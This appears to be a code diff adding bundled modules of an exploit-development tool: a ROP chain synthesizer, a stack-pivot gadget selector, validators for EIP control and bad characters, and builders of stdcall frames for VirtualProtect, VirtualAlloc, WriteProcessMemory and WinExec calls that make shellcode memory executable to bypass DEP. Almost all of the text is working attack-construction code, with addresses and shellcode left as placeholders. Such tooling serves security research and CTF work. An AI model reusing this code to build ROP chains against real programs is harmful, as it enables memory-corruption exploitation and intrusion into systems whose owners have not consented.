+        };
+      }
+      if (!strategy.possible) {
+        return {
+          planId: plan.id,
+          strategy: plan.strategy,
+          strategyId: strategy.id,
+          shape: strategy.shape,
+          success: false,
+          gadgets: [],
+          missing: strategy.missing,
+          diagnostics: [strategy.reason]
+        };
+      }
+      const gadgets = [];
+      const missing = [];
+      for (const capability2 of strategy.required) {
+        const selected = rankCandidates(index.query({ capability: capability2 }))[0];
+        const location = selected ? knownAddress(selected) : void 0;
+        if (!selected || !location) {
+          missing.push(capability2);
+          continue;
+        }
+        gadgets.push({
+          capability: capability2,
+          canonicalId: selected.canonicalId,
+          address: location.address,
+          module: location.module,
+          sequence: selected.instructions.map((instruction) => instruction.normalizedText).join(" ; "),
+          score: selected.score,
+          stackDelta: exactStackDelta(selected),
+          sideEffects: sideEffectCount(selected)
+        });
+      }
+      return {
+        planId: plan.id,
+        strategy: plan.strategy,
+        strategyId: strategy.id,
+        shape: strategy.shape,
+        success: missing.length === 0,
+        gadgets,
+        missing,
+        diagnostics: missing.length === 0 ? ["Gadget assignment (not an ordered executable chain). Use chain_vp/chain_wpm/chain_va for executable chain output."] : [`No address-bearing gadget satisfies: ${missing.join(", ")}.`]
+      };
+    }
+  };
+  function emissionRows(result3) {
+    if (result3.gadgets.length === 0) {
+      return [{
+        Plan: result3.planId.toString(),
+        Strategy: `${result3.strategy} / ${result3.shape}`,
+        Status: result3.success ? "ok" : "unavailable",
+        Missing: result3.missing.join(", "),
+        Diagnostic: result3.diagnostics.join(" ")
+      }];
+    }
+    return result3.gadgets.map((gadget) => {
+      var _a, _b;
+      return {
+        Plan: result3.planId.toString(),
+        Strategy: `${result3.strategy} / ${result3.shape}`,
+        Capability: gadget.capability,
+        Address: `0x${gadget.address.toString(16).toUpperCase()}`,
+        Module: gadget.module,
+        Sequence: gadget.sequence,
+        Score: gadget.score.toString(),
+        StackDelta: (_b = (_a = gadget.stackDelta) == null ? void 0 : _a.toString()) != null ? _b : "unknown",
+        SideEffects: gadget.sideEffects.toString()
+      };
+    });
+  }
+
+  // src/rop/synthesizer.ts
+  function hex322(value) {
+    const v = typeof value === "bigint" ? value : __bi(value >>> 0);
+    return `0x${v.toString(16).toUpperCase().padStart(8, "0")}`;
+  }
+  function uniqueBytes3(values) {
+    const seen = /* @__PURE__ */ new Set();
+    for (const v of values != null ? values : []) {
+      if (Number.isInteger(v) && v >= 0 && v <= 255)
+        seen.add(v & 255);
+    }
+    return [...seen].sort((a, b) => a - b);
+  }
+  function badcharHits2(value, badchars) {
+    if (badchars.length === 0)
+      return [];
+    const bad = new Set(badchars);
+    const hits = [];
+    const word = value >>> 0;
+    for (let i = 0; i < 4; i++) {
+      const byte = word >>> i * 8 & 255;
+      if (bad.has(byte) && !hits.includes(byte))
+        hits.push(byte);
+    }
+    return hits;
+  }
+  function byteList2(bytes) {
+    return bytes.map((b) => `0x${b.toString(16).toUpperCase().padStart(2, "0")}`).join(", ");
+  }
+  function gadgetSequence(gadget) {
+    return gadget.instructions.map((i) => i.normalizedText).join(" ; ");
+  }
+  var GP_REGISTERS = ["eax", "ebx", "ecx", "edx", "esi", "edi", "ebp", "esp"];
+  function findRetGadget(index) {
+    return index.gadgets.filter((g) => g.instructions.length === 1 && g.instructions[0].mnemonic === "ret" && g.instructions[0].operands.length === 0 && firstKnownAddress(g) !== void 0).sort((a, b) => b.score - a.score)[0];
+  }
+  function classifyPivotSource(gadget) {
+    const instrs = gadget.instructions;
+    const first = instrs[0];
+    if (first.mnemonic === "xchg" && first.operands.length === 2) {
+      const ops = first.operands.map((o) => o.trim().toLowerCase());
+      const espIdx = ops.indexOf("esp");
+      if (espIdx >= 0) {
+        const other = ops[1 - espIdx];
+        return { source: "register", sourceRegister: other, clobbers: [other, "esp"] };
+      }
+    }
+    if (first.mnemonic === "mov" && first.operands.length === 2) {
+      const dst = first.operands[0].trim().toLowerCase();
+      const src = first.operands[1].trim().toLowerCase();
+      if (dst === "esp" && GP_REGISTERS.includes(src)) {
+        return { source: "register", sourceRegister: src, clobbers: ["esp"] };
+      }
+    }
+    if (first.mnemonic === "add" && first.operands.length === 2) {
+      const dst = first.operands[0].trim().toLowerCase();
+      if (dst === "esp") {
+        const imm = first.operands[1].trim();
+        const val = imm.startsWith("0x") ? parseInt(imm, 16) : parseInt(imm, 10);
+        if (Number.isFinite(val)) {
+          return { source: "esp-adjust", adjustment: val, clobbers: ["esp"] };
+        }
+      }
+    }
+    if (first.mnemonic === "sub" && first.operands.length === 2) {
+      const dst = first.operands[0].trim().toLowerCase();
+      if (dst === "esp") {
+        const imm = first.operands[1].trim();
+        const val = imm.startsWith("0x") ? parseInt(imm, 16) : parseInt(imm, 10);
+        if (Number.isFinite(val)) {
+          return { source: "esp-adjust", adjustment: -val, clobbers: ["esp"] };
+        }
+      }
+    }
+    return { source: "memory", clobbers: ["esp"] };
+  }
+  function selectPivotGadget(index, state) {
+    const candidates2 = index.gadgets.filter((g) => g.capabilities.some((c) => c.kind === "STACK_PIVOT") && firstKnownAddress(g) !== void 0).sort((a, b) => {
+      const aLen = a.instructions.length;
+      const bLen = b.instructions.length;
+      if (aLen !== bLen)
+        return aLen - bLen;
+      return b.score - a.score;
+    });
+    for (const gadget of candidates2) {
+      const addr = firstKnownAddress(gadget);
+      const { source, sourceRegister, adjustment, clobbers } = classifyPivotSource(gadget);
+      if (source === "register" && sourceRegister) {
+        const regState = state.registers[sourceRegister];
+        if (!regState || regState.kind === "unknown")
+          continue;
+      }
+      const stackDelta = gadget.semanticSummary.summary.stackDelta.values.exact;
+      const delta = stackDelta.size === 1 ? [...stackDelta][0] : 0;
+      return {
+        gadget,
+        semantics: {
+          sequence: gadgetSequence(gadget),
+          address: addr,
+          source,
+          sourceRegister,
+          adjustment,
+          stackDeltaBeforePivot: delta,
+          clobbers
+        }
+      };
+    }
+    return void 0;
+  }
+  function validateForDirectApi(state, plan) {
+    var _a;
+    const blockers = [];
+    const warnings = [];
+    if (!state.control.instructionPointerControlled) {
+      blockers.push({ kind: "blocker", source: "control", message: "EIP is not controlled." });
+    }
+    if (state.control.mechanism !== "saved-ret") {
+      blockers.push({ kind: "blocker", source: "control", message: `Control mechanism "${state.control.mechanism}" is not saved-ret; DIRECT_API requires ret-based control transfer.` });
+    }
+    const frameSize = (apiFrameSlots(plan.strategy).length - 1) * 4;
+    if (state.stack.controlledAfterEsp < frameSize) {
+      blockers.push({ kind: "blocker", source: "stack", message: `Only ${state.stack.controlledAfterEsp} bytes controlled after ESP; ${frameSize} needed for ${plan.strategy} arguments (API address is the saved return, not on the stack).` });
+    }
+    if (!state.stack.writable) {
+      blockers.push({ kind: "blocker", source: "stack", message: "Stack region after ESP is not writable." });
+    }
+    if (state.stack.executable) {
+      warnings.push({ kind: "warning", source: "stack", message: "Stack is already executable; DEP bypass may be unnecessary." });
+    }
+    const alignment = (_a = state.stack.alignment) != null ? _a : 4;
+    if (alignment % 4 !== 0) {
+      warnings.push({ kind: "warning", source: "stack", message: `Stack alignment is ${alignment}-byte; stdcall frames assume 4-byte alignment.` });
+    }
+    if (plan.apiResolution === "iat" && state.constraints.apiResolution === "direct") {
+      blockers.push({ kind: "blocker", source: "resolution", message: "Plan requires IAT resolution but exploit state constrains to direct resolution." });
+    }
+    if (plan.apiResolution === "direct" && state.constraints.apiResolution === "iat") {
+      blockers.push({ kind: "blocker", source: "resolution", message: "Plan requires direct resolution but exploit state constrains to IAT resolution." });
+    }
+    return {
+      viable: blockers.length === 0,
+      entryPath: blockers.length === 0 ? "DIRECT_API" : void 0,
+      blockers,
+      warnings
+    };
+  }
+  function validateForRetToFrame(state, plan, index) {
+    var _a;
+    const blockers = [];
+    const warnings = [];
+    if (!state.control.instructionPointerControlled) {
+      blockers.push({ kind: "blocker", source: "control", message: "EIP is not controlled." });
+    }
+    if (state.control.mechanism !== "saved-ret") {
+      blockers.push({ kind: "blocker", source: "control", message: `Control mechanism "${state.control.mechanism}" is not saved-ret; RET_TO_FRAME requires ret-based control transfer.` });
+    }
+    const strategy = plan.strategies.find((s) => s.shape === "SYNTHETIC_STDCALL_FRAME" || s.shape === "RET_DISPATCH");
+    if (!(strategy == null ? void 0 : strategy.possible)) {
+      blockers.push({ kind: "blocker", source: "plan", message: "No flat stdcall shape is capability-feasible in the current plan." });
+    }
+    if (!findRetGadget(index)) {
+      blockers.push({ kind: "blocker", source: "corpus", message: "No plain ret gadget with a known address exists in the corpus." });
+    }
+    const frameSize = apiFrameSlots(plan.strategy).length * 4;
+    if (state.stack.controlledAfterEsp < frameSize) {
+      blockers.push({ kind: "blocker", source: "stack", message: `Only ${state.stack.controlledAfterEsp} bytes controlled after ESP; ${frameSize} needed for the ${plan.strategy} stdcall frame (ret gadget + API + args).` });
+    }
+    if (!state.stack.writable) {
+      blockers.push({ kind: "blocker", source: "stack", message: "Stack region after ESP is not writable." });
+    }
+    if (state.stack.executable) {
+      warnings.push({ kind: "warning", source: "stack", message: "Stack is already executable; DEP bypass may be unnecessary." });
+    }
+    if (plan.apiResolution === "iat" && state.constraints.apiResolution === "direct") {
+      blockers.push({ kind: "blocker", source: "resolution", message: "Plan requires IAT resolution but exploit state constrains to direct resolution." });
+    }
+    if (plan.apiResolution === "direct" && state.constraints.apiResolution === "iat") {
+      blockers.push({ kind: "blocker", source: "resolution", message: "Plan requires direct resolution but exploit state constrains to IAT resolution." });
+    }
+    const alignment = (_a = state.stack.alignment) != null ? _a : 4;
+    if (alignment % 4 !== 0) {
+      warnings.push({ kind: "warning", source: "stack", message: `Stack alignment is ${alignment}-byte; stdcall frames assume 4-byte alignment.` });
+    }
+    return {
+      viable: blockers.length === 0,
+      entryPath: blockers.length === 0 ? "RET_TO_FRAME" : void 0,
+      blockers,
+      warnings
+    };
+  }
+  function validateForPivotToFrame(state, plan, index) {
+    var _a;
+    const blockers = [];
+    const warnings = [];
+    if (!state.control.instructionPointerControlled) {
+      blockers.push({ kind: "blocker", source: "control", message: "EIP is not controlled." });
+    }
+    const pivotShape = plan.strategies.find((s) => s.shape === "STACK_PIVOT_FRAME");
+    if (!(pivotShape == null ? void 0 : pivotShape.possible)) {
+      blockers.push({ kind: "blocker", source: "plan", message: "STACK_PIVOT_FRAME is not capability-feasible in the current plan." });
+    }
+    const pivotSelection = selectPivotGadget(index, state);
+    if (!pivotSelection) {
+      const hasPivotGadgets = index.gadgets.some((g) => g.capabilities.some((c) => c.kind === "STACK_PIVOT") && firstKnownAddress(g) !== void 0);
+      if (hasPivotGadgets) {
+        blockers.push({ kind: "blocker", source: "pivot", message: "Pivot gadgets exist but none have a source register in a known state. Declare the register state in ExploitState.registers." });
+      } else {
+        blockers.push({ kind: "blocker", source: "corpus", message: "No stack-pivot gadget with a known address exists in the corpus." });
+      }
+    }
+    const hasControlledRegion = ((_a = state.memory) != null ? _a : []).some((r) => r.controlled && r.writable && r.size >= 24);
+    if (!hasControlledRegion && state.stack.controlledAfterEsp < 24) {
+      blockers.push({ kind: "blocker", source: "memory", message: "No controlled, writable memory region large enough for a stdcall frame is described in the exploit state." });
+    }
+    if (state.stack.controlledAfterEsp < 8) {
+      blockers.push({ kind: "blocker", source: "stack", message: "Fewer than 8 controlled bytes after ESP; not enough room for a pivot gadget address and target." });
+    }
+    if (plan.apiResolution === "iat" && state.constraints.apiResolution === "direct") {
+      blockers.push({ kind: "blocker", source: "resolution", message: "Plan requires IAT resolution but exploit state constrains to direct resolution." });
+    }
+    if (plan.apiResolution === "direct" && state.constraints.apiResolution === "iat") {
+      blockers.push({ kind: "blocker", source: "resolution", message: "Plan requires direct resolution but exploit state constrains to IAT resolution." });
+    }
+    return {
+      viable: blockers.length === 0,
+      entryPath: blockers.length === 0 ? "PIVOT_TO_FRAME" : void 0,
+      blockers,
+      warnings
+    };
+  }
+  function apiFrameSlots(strategy) {
+    switch (strategy) {
+      case "VirtualProtect":
+        return [
+          { role: "api-address", placeholder: "VIRTUALPROTECT", comment: "VirtualProtect" },
+          { role: "return-address", placeholder: "RETURN_ADDR", comment: "return address (e.g. shellcode or jmp esp)" },
+          { role: "arg1-lpAddress", placeholder: "LP_ADDRESS", comment: "lpAddress" },
+          { role: "arg2-dwSize", value: 513, comment: "dwSize" },
+          { role: "arg3-flNewProtect", value: 64, comment: "flNewProtect = PAGE_EXECUTE_READWRITE" },
+          { role: "arg4-lpflOldProtect", placeholder: "WRITABLE", comment: "lpflOldProtect (writable dummy)" }
+        ];
+      case "VirtualAlloc":
+        return [
+          { role: "api-address", placeholder: "VIRTUALALLOC", comment: "VirtualAlloc" },
+          { role: "return-address", placeholder: "RETURN_ADDR", comment: "return address" },
+          { role: "arg1-lpAddress", placeholder: "LP_ADDRESS", comment: "lpAddress" },
+          { role: "arg2-dwSize", value: 513, comment: "dwSize" },
+          { role: "arg3-flAllocationType", value: 4096, comment: "flAllocationType = MEM_COMMIT" },
+          { role: "arg4-flProtect", value: 64, comment: "flProtect = PAGE_EXECUTE_READWRITE" }
+        ];
+      case "WriteProcessMemory":
+        return [
+          { role: "api-address", placeholder: "WRITEPROCESSMEMORY", comment: "WriteProcessMemory" },
+          { role: "return-address", placeholder: "RETURN_ADDR", comment: "return address" },
+          { role: "arg1-hProcess", value: 4294967295, comment: "hProcess = GetCurrentProcess()" },
+          { role: "arg2-lpBaseAddress", placeholder: "LP_BASE_ADDRESS", comment: "lpBaseAddress (executable dest)" },
+          { role: "arg3-lpBuffer", placeholder: "LP_BUFFER", comment: "lpBuffer (source shellcode)" },
+          { role: "arg4-nSize", placeholder: "NSIZE", comment: "nSize" },
+          { role: "arg5-lpNBW", placeholder: "WRITABLE", comment: "lpNumberOfBytesWritten (writable dummy)" }
+        ];
+      case "VirtualProtectEx":
+        return [
+          { role: "api-address", placeholder: "VIRTUALPROTECTEX", comment: "VirtualProtectEx" },
+          { role: "return-address", placeholder: "RETURN_ADDR", comment: "return address (e.g. shellcode or jmp esp)" },
+          { role: "arg1-hProcess", value: 4294967295, comment: "hProcess = GetCurrentProcess()" },
+          { role: "arg2-lpAddress", placeholder: "LP_ADDRESS", comment: "lpAddress" },
+          { role: "arg3-dwSize", value: 513, comment: "dwSize" },
+          { role: "arg4-flNewProtect", value: 64, comment: "flNewProtect = PAGE_EXECUTE_READWRITE" },
+          { role: "arg5-lpflOldProtect", placeholder: "WRITABLE", comment: "lpflOldProtect (writable dummy)" }
+        ];
+      case "VirtualAllocEx":
+        return [
+          { role: "api-address", placeholder: "VIRTUALALLOCEX", comment: "VirtualAllocEx" },
+          { role: "return-address", placeholder: "RETURN_ADDR", comment: "return address" },
+          { role: "arg1-hProcess", value: 4294967295, comment: "hProcess = GetCurrentProcess()" },
+          { role: "arg2-lpAddress", placeholder: "LP_ADDRESS", comment: "lpAddress" },
+          { role: "arg3-dwSize", value: 513, comment: "dwSize" },
+          { role: "arg4-flAllocationType", value: 4096, comment: "flAllocationType = MEM_COMMIT" },
+          { role: "arg5-flProtect", value: 64, comment: "flProtect = PAGE_EXECUTE_READWRITE" }
+        ];
+      case "WinExec":
+        return [
+          { role: "api-address", placeholder: "WINEXEC", comment: "WinExec" },
+          { role: "return-address", placeholder: "RETURN_ADDR", comment: "return address (e.g. ExitProcess or a ret)" },
+          { role: "arg1-lpCmdLine", placeholder: "LP_CMDLINE", comment: "lpCmdLine (pointer to command string)" },
+          { role: "arg2-uCmdShow", value: 1, comment: "uCmdShow = SW_SHOWNORMAL" }
+        ];
+      case "LoadLibraryA":
+        return [
+          { role: "api-address", placeholder: "LOADLIBRARYA", comment: "LoadLibraryA" },
+          { role: "return-address", placeholder: "RETURN_ADDR", comment: "return address (e.g. next stage or GetProcAddress chain)" },
+          { role: "arg1-lpLibFileName", placeholder: "LP_LIBFILENAME", comment: "lpLibFileName (pointer to DLL name string)" }
+        ];
+      case "GetProcAddress":
+        return [
+          { role: "api-address", placeholder: "GETPROCADDRESS", comment: "GetProcAddress" },
+          { role: "return-address", placeholder: "RETURN_ADDR", comment: "return address (e.g. resolved function or next stage)" },
+          { role: "arg1-hModule", placeholder: "HMODULE", comment: "hModule (from LoadLibraryA return value)" },
+          { role: "arg2-lpProcName", placeholder: "LP_PROCNAME", comment: "lpProcName (pointer to function name string)" }
+        ];
+      case "Stack Pivot":
+        return [
+          { role: "pivot-target", placeholder: "PIVOT_TARGET", comment: "pivot target address" }
+        ];
+    }
+  }
+  function checkAddressBadchars(addr, badchars, label) {
+    const hits = badcharHits2(Number(__bi.and(addr, __bi(4294967295))), badchars);
+    if (hits.length > 0) {
+      return { kind: "violation", source: label, message: `${label} ${hex322(addr)} contains badchar byte(s) ${byteList2(hits)}.` };
+    }
+    return void 0;
+  }
+  function buildFrameSlots(frameDefs, badchars, startOffset) {
+    const placeholders = /* @__PURE__ */ new Set();
+    const violations = [];
+    const warnings = [];
+    const slots = [];
+    let offset = startOffset;
+    for (const def of frameDefs) {
+      let step;
+      if (def.value !== void 0) {
+        const v = def.value >>> 0;
+        const hits = badcharHits2(v, badchars);
+        if (hits.length > 0) {
+          violations.push({
+            kind: "violation",
+            source: def.role,
+            message: `${def.comment}: ${hex322(v)} contains badchar byte(s) ${byteList2(hits)}.`
+          });
+        }
+        step = { kind: "value", value: v, comment: def.comment };
+      } else {
+        placeholders.add(def.placeholder);
+        warnings.push({
+          kind: "warning",
+          source: def.role,
+          message: `${def.placeholder}: placeholder value must be checked against badchars after resolution.`
+        });
+        step = { kind: "value", placeholder: def.placeholder, comment: def.comment };
+      }
+      slots.push({ offset, size: 4, role: def.role, step });
+      offset += 4;
+    }
+    return { slots, placeholders: [...placeholders], violations, warnings };
+  }
+  function checkPayloadLength(totalBytes, state) {
+    const max = state.constraints.maximumPayloadLength;
+    if (max !== void 0 && totalBytes > max) {
+      return {
+        kind: "blocker",
+        source: "payload-length",
+        message: `Layout requires ${totalBytes} bytes but maximumPayloadLength is ${max}.`
+      };
+    }
+    return void 0;
+  }
+  function synthesizeDirectApi(plan, state, badchars) {
+    const frameDefs = apiFrameSlots(plan.strategy);
+    const apiSlot = frameDefs.shift();
+    const { slots, placeholders, violations, warnings } = buildFrameSlots(frameDefs, badchars, 0);
+    const apiStep = { kind: "value", placeholder: apiSlot.placeholder, comment: `saved EIP = ${apiSlot.comment} (direct overwrite)` };
+    const allPlaceholders = /* @__PURE__ */ new Set([apiSlot.placeholder, ...placeholders]);
+    warnings.push({
+      kind: "warning",
+      source: "api-address",
+      message: `${apiSlot.placeholder}: saved EIP must contain the API address; check against badchars after resolution.`
+    });
+    const allSlots = [
+      { offset: -4, size: 4, role: "saved-eip", step: apiStep },
+      ...slots
+    ];
+    const totalBytes = allSlots.length * 4;
+    const lengthCheck = checkPayloadLength(totalBytes, state);
+    if (lengthCheck) {
+      return blocked(plan, "DIRECT_API", [lengthCheck]);
+    }
+    const hasViolations = violations.length > 0;
+    return {
+      status: hasViolations ? "complete-with-violations" : "complete",
+      layoutProduced: true,
+      constraintCompatible: !hasViolations,
+      planId: plan.id,
+      strategy: plan.strategy,
+      shape: "SYNTHETIC_STDCALL_FRAME",
+      entryPath: "DIRECT_API",
+      slots: allSlots,
+      totalBytes,
+      placeholders: [...allPlaceholders],
+      blockers: [],
+      violations,
+      warnings
+    };
+  }
+  function synthesizeRetToFrame(index, plan, state, badchars) {
+    const retGadget = findRetGadget(index);
+    const retAddr = firstKnownAddress(retGadget);
+    const violations = [];
+    const warnings = [];
+    const retCheck = checkAddressBadchars(retAddr, badchars, "ret gadget");
+    if (retCheck)
+      violations.push(retCheck);
+    const retStep = {
+      kind: "gadget",
+      address: retAddr,
+      comment: `saved EIP = ret gadget (dispatches to frame at ESP)`
+    };
+    const frameDefs = apiFrameSlots(plan.strategy);
+    const { slots: frameSlots, placeholders, violations: frameViolations, warnings: frameWarnings } = buildFrameSlots(frameDefs, badchars, 0);
+    violations.push(...frameViolations);
+    warnings.push(...frameWarnings);
+    const allSlots = [
+      { offset: -4, size: 4, role: "saved-eip", step: retStep },
+      ...frameSlots
+    ];
+    const totalBytes = allSlots.length * 4;
+    const lengthCheck = checkPayloadLength(totalBytes, state);
+    if (lengthCheck) {
+      return blocked(plan, "RET_TO_FRAME", [lengthCheck]);
+    }
+    const hasViolations = violations.length > 0;
+    return {
+      status: hasViolations ? "complete-with-violations" : "complete",
+      layoutProduced: true,
+      constraintCompatible: !hasViolations,
+      planId: plan.id,
+      strategy: plan.strategy,
+      shape: "SYNTHETIC_STDCALL_FRAME",
+      entryPath: "RET_TO_FRAME",
+      slots: allSlots,
+      totalBytes,
+      placeholders,
+      blockers: [],
+      violations,
+      warnings
+    };
+  }
+  function synthesizePivotToFrame(index, plan, state, badchars, pivotSel) {
+    const violations = [];
+    const warnings = [];
+    const pivotCheck = checkAddressBadchars(pivotSel.semantics.address, badchars, "pivot gadget");
+    if (pivotCheck)
+      violations.push(pivotCheck);
+    const pivotStep = {
+      kind: "gadget",
+      address: pivotSel.semantics.address,
+      comment: `saved EIP = pivot: ${pivotSel.semantics.sequence}`
+    };
+    const pivotDestStep = {
+      kind: "value",
+      placeholder: "PIVOT_DEST",
+      comment: "pivot destination (controlled region holding the stdcall frame)"
+    };
+    const frameDefs = apiFrameSlots(plan.strategy);
+    const { slots: frameSlots, placeholders: framePlaceholders, violations: frameViolations, warnings: frameWarnings } = buildFrameSlots(frameDefs, badchars, 8);
+    violations.push(...frameViolations);
+    warnings.push(...frameWarnings);
+    const allPlaceholders = /* @__PURE__ */ new Set(["PIVOT_DEST", ...framePlaceholders]);
+    warnings.push({
+      kind: "warning",
+      source: "pivot-destination",
+      message: "PIVOT_DEST: set to a controlled, writable region that holds the stdcall frame."
+    });
+    const allSlots = [
+      { offset: -4, size: 4, role: "saved-eip", step: pivotStep },
+      { offset: 0, size: 4, role: "pivot-destination", step: pivotDestStep },
+      ...frameSlots
+    ];
+    const totalBytes = allSlots.length * 4;
+    const lengthCheck = checkPayloadLength(totalBytes, state);
+    if (lengthCheck) {
+      return blocked(plan, "PIVOT_TO_FRAME", [lengthCheck]);
+    }
+    const hasViolations = violations.length > 0;
+    return {
+      status: hasViolations ? "complete-with-violations" : "complete",
+      layoutProduced: true,
+      constraintCompatible: !hasViolations,
+      planId: plan.id,
+      strategy: plan.strategy,
+      shape: "STACK_PIVOT_FRAME",
+      entryPath: "PIVOT_TO_FRAME",
+      pivot: pivotSel.semantics,
+      slots: allSlots,
+      totalBytes,
+      placeholders: [...allPlaceholders],
+      blockers: [],
+      violations,
+      warnings
+    };
+  }
+  function blocked(plan, entryPath, blockers) {
+    return {
+      status: "blocked",
+      layoutProduced: false,
+      constraintCompatible: false,
+      planId: plan.id,
+      strategy: plan.strategy,
+      shape: "SYNTHETIC_STDCALL_FRAME",
+      entryPath,
+      slots: [],
+      totalBytes: 0,
+      placeholders: [],
+      blockers,
+      violations: [],
+      warnings: []
+    };
+  }
+  function synthesize(index, plan, state) {
+    const badchars = uniqueBytes3(state.constraints.badchars);
+    const retToFrameVal = validateForRetToFrame(state, plan, index);
+    const directApiVal = validateForDirectApi(state, plan);
+    const pivotVal = validateForPivotToFrame(state, plan, index);
+    if (retToFrameVal.viable) {
+      const result3 = synthesizeRetToFrame(index, plan, state, badchars);
+      result3.warnings.push(...retToFrameVal.warnings);
+      return result3;
+    }
+    if (directApiVal.viable) {
+      const result3 = synthesizeDirectApi(plan, state, badchars);
+      result3.warnings.push(...directApiVal.warnings);
+      return result3;
+    }
+    if (pivotVal.viable) {
+      const pivotSel = selectPivotGadget(index, state);
+      const result3 = synthesizePivotToFrame(index, plan, state, badchars, pivotSel);
+      result3.warnings.push(...pivotVal.warnings);
+      return result3;
+    }
+    return {
+      status: "blocked",
+      layoutProduced: false,
+      constraintCompatible: false,
+      planId: plan.id,
+      strategy: plan.strategy,
+      shape: "SYNTHETIC_STDCALL_FRAME",
+      entryPath: "DIRECT_API",
+      slots: [],
+      totalBytes: 0,
+      placeholders: [],
+      blockers: [
+        ...retToFrameVal.blockers.map((b) => __spreadProps(__spreadValues({}, b), { source: `RET_TO_FRAME/${b.source}` })),
+        ...directApiVal.blockers.map((b) => __spreadProps(__spreadValues({}, b), { source: `DIRECT_API/${b.source}` })),
+        ...pivotVal.blockers.map((b) => __spreadProps(__spreadValues({}, b), { source: `PIVOT_TO_FRAME/${b.source}` }))
+      ],
+      violations: [],
+      warnings: []
+    };
+  }
+  function synthesisRows(result3) {
+    var _a;
+    if (!result3.layoutProduced) {
+      return [
+        {
+          Plan: result3.planId.toString(),
+          Strategy: `${result3.strategy} / ${result3.shape}`,
+          Status: result3.status,
+          Path: result3.entryPath,
+          Diagnostic: result3.blockers.map((b) => b.message).join(" ")
+        }
+      ];
+    }
+    const rows = [];
+    rows.push({
+      Plan: result3.planId.toString(),
+      Strategy: `${result3.strategy} / ${result3.shape}`,
+      Status: result3.status,
+      Path: result3.entryPath,
+      Layout: result3.layoutProduced ? "produced" : "none",
+      Compatible: result3.constraintCompatible ? "yes" : "no"
+    });
+    for (const slot of result3.slots) {
+      rows.push({
+        Offset: slot.offset < 0 ? `${slot.offset}` : `+${slot.offset}`,
+        Role: slot.role,
+        Word: slot.step.kind === "gadget" ? hex322(slot.step.address) : (_a = slot.step.placeholder) != null ? _a : hex322(slot.step.value),
+        Comment: slot.step.comment
+      });
+    }
+    for (const v of result3.violations) {
+      rows.push({ Diagnostic: "VIOLATION", Detail: v.message });
+    }
+    return rows;
+  }
+
+  // src/rop/exploit_frame.ts
+  function buildExploitFrame(strategy, retAddrWord, writableWord) {
+    const junk = { value: 2425393296, comment: "junk" };
+    switch (strategy) {
+      case "VirtualProtect":
+        return [
+          retAddrWord,
+          { placeholder: "SHELLCODE", comment: "lpAddress (shellcode start on stack)" },
+          { value: 513, comment: "dwSize" },
+          { value: 64, comment: "flNewProtect = PAGE_EXECUTE_READWRITE" },
+          writableWord
+        ];
+      case "VirtualAlloc":
+        return [
+          retAddrWord,
+          { placeholder: "SHELLCODE", comment: "lpAddress (NULL = OS chooses, or BUF+N)" },
+          { value: 4096, comment: "dwSize = 0x1000" },
+          { value: 4096, comment: "flAllocationType = MEM_COMMIT" },
+          { value: 64, comment: "flProtect = PAGE_EXECUTE_READWRITE" }
+        ];
+      case "WriteProcessMemory":
+        return [
+          retAddrWord,
+          { value: 4294967295, comment: "hProcess = GetCurrentProcess()" },
+          { placeholder: "DEST", comment: "lpBaseAddress (executable destination)" },
+          { placeholder: "SHELLCODE", comment: "lpBuffer (shellcode on stack)" },
+          { placeholder: "SHELLCODE_LEN", comment: "nSize (shellcode byte count)" },
+          writableWord
+        ];
+      case "VirtualProtectEx":
+        return [
+          retAddrWord,
+          { value: 4294967295, comment: "hProcess = GetCurrentProcess()" },
+          { placeholder: "SHELLCODE", comment: "lpAddress" },
+          { value: 513, comment: "dwSize" },
+          { value: 64, comment: "flNewProtect = PAGE_EXECUTE_READWRITE" },
+          writableWord
+        ];
+      case "VirtualAllocEx":
+        return [
+          retAddrWord,
+          { value: 4294967295, comment: "hProcess = GetCurrentProcess()" },
+          { placeholder: "SHELLCODE", comment: "lpAddress" },
+          { value: 4096, comment: "dwSize" },
+          { value: 4096, comment: "flAllocationType = MEM_COMMIT" },
+          { value: 64, comment: "flProtect = PAGE_EXECUTE_READWRITE" }
+        ];
+      case "WinExec":
+        return [
+          retAddrWord,
+          { placeholder: "CMD_STRING", comment: "lpCmdLine pointer" },
+          { value: 1, comment: "uCmdShow = SW_SHOWNORMAL" }
+        ];
+      default:
+        return [retAddrWord, junk];
+    }
+  }
+
+  // src/rop/chain_verifier.ts
+  function hex323(v) {
+    return `0x${(v >>> 0).toString(16).toUpperCase().padStart(8, "0")}`;
+  }
+  function dwordBytes(value) {
+    const v = value >>> 0;
+    return [v & 255, v >>> 8 & 255, v >>> 16 & 255, v >>> 24 & 255];
+  }
+  function resolveStepDword(step) {
+    if (step.kind === "gadget" && step.address !== void 0)
+      return Number(step.address) >>> 0;
+    if (step.value !== void 0)
+      return step.value >>> 0;
+    return void 0;
+  }
+  function stepDwordHex(step) {
+    const v = resolveStepDword(step);
+    return v !== void 0 ? hex323(v) : "????????";
+  }
+  function analyzeStatic(input) {
+    var _a, _b;
+    const { steps, badchars } = input;
+    const badSet = new Set(badchars.map((b) => b & 255));
+    const hits = [];
+    const unresolved = [];
+    const assumptions = [];
+    for (let i = 0; i < steps.length; i++) {
+      const step = steps[i];
+      const byteOffset = i * 4;
+      if (step.placeholder) {
+        unresolved.push({
+          stepIndex: i,
+          byteOffset,
+          placeholder: step.placeholder,
+          comment: step.comment
+        });
+        continue;
+      }
+      const dword = resolveStepDword(step);
+      if (dword === void 0)
+        continue;
+      if (badSet.size > 0) {
+        const bytes = dwordBytes(dword);
+        for (let pos = 0; pos < 4; pos++) {
+          if (badSet.has(bytes[pos])) {
+            hits.push({
+              stepIndex: i,
+              byteOffset: byteOffset + pos,
+              byte: bytes[pos],
+              bytePosition: pos,
+              dwordHex: hex323(dword),
+              comment: step.comment
+            });
+          }
+        }
+      }
+    }
+    const totalBytes = steps.length * 4;
+    const aligned = totalBytes % 4 === 0;
+    let frameCheck;
+    if (input.api || input.expectedArgCount !== void 0) {
+      const apiName = (_a = input.api) != null ? _a : "";
+      const knownArgCount = (_b = input.expectedArgCount) != null ? _b : STDCALL_ARG_COUNT[apiName];
+      if (knownArgCount === void 0) {
+        frameCheck = {
+          api: apiName,
+          expectedArgCount: 0,
+          expectedFrameWords: 0,
+          status: "unknown_api",
+          detail: `Unknown API "${apiName}" \u2014 cannot validate frame structure. Known APIs: ${Object.keys(STDCALL_ARG_COUNT).join(", ")}`
+        };
+      } else {
+        const expectedWords = 1 + knownArgCount;
+        const hasGadgets = steps.some((s) => s.kind === "gadget");
+        if (hasGadgets) {
+          frameCheck = {
+            api: apiName,
+            expectedArgCount: knownArgCount,
